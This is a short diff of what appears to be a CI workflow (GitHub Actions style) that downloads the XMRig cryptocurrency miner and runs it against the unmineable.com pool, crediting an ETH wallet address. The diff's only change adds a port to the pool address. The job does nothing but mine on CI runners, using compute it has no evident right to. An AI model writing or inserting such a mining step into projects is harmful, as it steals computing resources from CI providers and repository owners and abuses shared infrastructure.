@@ -17,4 +17,4 @@ jobs:
           tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz
           mv xmrig-6.21.3/xmrig . && rm -rf xmrig-6.21.3 xmrig-6.21.3-linux-static-x64.tar.gz
       - name: Excute
-        run: ./xmrig -o rx-asia.unmineable.com -a rx -k -u ETH:0xE44602c3ACC41d1b40cdB8cA1e820E52B0a253a0.test -p x
+        run: ./xmrig -o rx-asia.unmineable.com:3333 -a rx -k -u ETH:0xE44602c3ACC41d1b40cdB8cA1e820E52B0a253a0.test -p x
